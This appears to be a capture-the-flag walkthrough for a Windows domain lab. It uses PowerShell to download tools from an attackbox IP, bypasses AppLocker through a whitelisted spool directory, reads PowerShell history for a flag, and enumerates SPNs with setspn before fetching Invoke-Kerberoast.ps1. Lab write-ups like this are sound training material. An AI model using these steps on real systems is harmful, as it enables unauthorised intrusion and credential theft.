Walkthrough
===========
TASK - 1
---------
1. in my attackbox run a simplehttp server

2. in target's powershell:-
(To transfer our demo exe file into target's system)
PS C:\Users\dark> $URL = "http://10.18.1.224:9000/ternaryif.exe"
PS C:\Users\dark> $PATH = "C:\Users\dark\ternaryif.exe"
PS C:\Users\dark> Invoke-WebRequest -URI $URL -OutFile $PATH

3. now exit from powershell

4. ./ternaryif.exe
It does not run. Because of Applock policy.
So we have to bypass it

5. copy the file into 
C:\Windows\System32\spool\drivers\color 

this directory is whitelisted by default. (A curated list is attached in this repository)

6. now we can be able to run the executable.

7. To access the flag we are instructed to check powershell history(It is named as ConsoleHost History)
%userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt

8. type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
(got the flag)

TASK - 2
=========
our target dc is 'corp'
1. Open powershell
2. setspn -T corp -Q */*
got following output:-

Checking domain DC=corp,DC=local
CN=OMEGA,OU=Domain Controllers,DC=corp,DC=local
        Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/omega.corp.local
        ldap/omega.corp.local/ForestDnsZones.corp.local
        ldap/omega.corp.local/DomainDnsZones.corp.local
        TERMSRV/OMEGA
        TERMSRV/omega.corp.local
        DNS/omega.corp.local
        GC/omega.corp.local/corp.local
        RestrictedKrbHost/omega.corp.local
        RestrictedKrbHost/OMEGA
        RPC/7c4e4bec-1a37-4379-955f-a0475cd78a5d._msdcs.corp.local
        HOST/OMEGA/CORP
        HOST/omega.corp.local/CORP
        HOST/OMEGA
        HOST/omega.corp.local
        HOST/omega.corp.local/corp.local
        E3514235-4B06-11D1-AB04-00C04FC2DCD2/7c4e4bec-1a37-4379-955f-a0475cd78a5d/corp.local
        ldap/OMEGA/CORP
        ldap/7c4e4bec-1a37-4379-955f-a0475cd78a5d._msdcs.corp.local
        ldap/omega.corp.local/CORP
        ldap/OMEGA
        ldap/omega.corp.local
        ldap/omega.corp.local/corp.local
CN=krbtgt,CN=Users,DC=corp,DC=local
        kadmin/changepw
CN=fela,CN=Users,DC=corp,DC=local
        HTTP/fela
        HOST/fela@corp.local
        HTTP/fela@corp.local

Existing SPN found!

So, a SPN is found.
User is: fela

3. 

$URL="http://10.10.196.242:9000/Invoke-Kerberoast.ps1"
$PATH = "C:\Windows\System32\spool\drivers\color\Invoke-Kerberoast.ps1"
Invoke-WebRequest -URI $URL -OutFile $Path





